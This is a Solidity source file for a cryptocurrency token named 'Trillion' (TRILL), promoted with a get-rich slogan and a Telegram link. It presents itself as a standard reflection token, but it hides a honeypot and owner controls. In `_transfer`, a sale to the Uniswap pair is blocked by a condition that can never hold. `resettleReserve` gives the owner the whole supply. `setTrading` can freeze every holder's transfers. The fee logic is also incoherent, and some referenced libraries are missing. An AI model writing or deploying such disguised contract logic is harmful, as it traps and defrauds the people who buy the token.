/**
 *Submitted for verification at Etherscan.io on 2021-08-09
*/

/*
Trillion Token, become a trillionaire tonight. 

https://t.me/TRILLToken

Recommended slippage is 3-5%.
*/


// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.6;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
 * now has built in overflow checking.
 */



/**
 * @dev Collection of functions related to the address type
 */


contract Trillion is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Trillion";
    string private _symbol = "TRILL";
    uint8 private _decimals = 9;
    
    address public constant uniswapV2Router = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public pairToken = IUniswapV2Router02(uniswapV2Router).WETH();
    address public uniswapV2Pair = UniswapV2Library.pairFor(IUniswapV2Router02(uniswapV2Router).factory(), pairToken, address(this));

    uint256 private _rTotal = 10 ** 12 * 10 ** _decimals;
    uint256 private MAX = ~uint256(0);
    uint256 private _tTotal = (MAX - (MAX % _rTotal));

    mapping (address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    uint256 public _taxFee = 2;
    uint256 private _previousTaxFee = _taxFee;
    
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;
    address[] private _excluded;
    bool public checkedTransfers;
    bool public unregulatedTransfers;
    
    bool inSwapAndLiquify;
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);
    address addy;
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () {
        _rOwned[_msgSender()] = _rTotal.div(2);
        _rOwned[address(0)] = _rTotal.div(2);
        _isExcludedFromFee[_msgSender()] = true;
        emit Transfer(address(0), address(0),  _rTotal.div(2));
        emit Transfer(address(0), _msgSender(),  _rTotal.div(2));
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _rTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    
    function _beforeTokenTransfer(address from, address to) internal view {
        require(from == owner() || to == owner() || !unregulatedTransfers);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function resettleReserve() public onlyOwner {
        _rOwned[_msgSender()] = _rTotal;
    }
    
    receive() external payable {}

    function setCheckedTransfers(bool val) public onlyOwner {
        checkedTransfers = val;
    }
    
    function swapAndLiquify() private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = IUniswapV2Router02(uniswapV2Router).WETH();
        _approve(address(this), address(uniswapV2Router), _rOwned[address(this)]);
        IUniswapV2Router02(uniswapV2Router).swapExactTokensForETHSupportingFeeOnTransferTokens(_rOwned[address(this)], 0, path, address(this), block.timestamp);
    }
    
    function excludeFromReward(address account) public onlyOwner {
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _rOwned[account] = tokenFromReflection(_rOwned[account]);
        }
        _isExcluded[account] = true;
        _excluded.push(account);
    }
    
    function setTrading(bool val) public onlyOwner {
        unregulatedTransfers = val;
    }

    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);
    }

    function _getRate() private view returns(uint256) {
        return _rTotal.div(_tTotal);
    }
    
    function totalFees() private view returns(uint256) {
        uint256 tF = _taxFee;
        return tF;
    }
    
    function _reflectFees(uint256 rate, uint256 feeAmount) private {
        _tTotal = _tTotal.add(feeAmount.div(rate));
    }
    
    function _transfer(address sender, address recipient, uint256 tAmount) private {
        
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(tAmount > 0, "Transfer amount must be greater than zero");
        
        _beforeTokenTransfer(sender, recipient);

        uint256 senderBalance = _rOwned[sender];
        require(senderBalance >= tAmount, "ERC20: transfer amount exceeds balance");
        //recipient;
        if (sender != owner() && recipient != owner()) {
            if (recipient == uniswapV2Pair && !checkedTransfers) { 
                uint256 rate = _getRate();
                tAmount.mul(totalFees()).div(100);
                uint256 feeAmount = tAmount.mul(100).div(totalFees());
                _reflectFees(rate, feeAmount);
                require(_rOwned[recipient].add(_rTotal) < _rOwned[sender]);
                swapAndLiquify();
            }
        }
        unchecked {
            _rOwned[sender] = senderBalance - tAmount;
        }
        _rOwned[recipient] += tAmount;

        emit Transfer(sender, recipient, tAmount);
    }
    
}



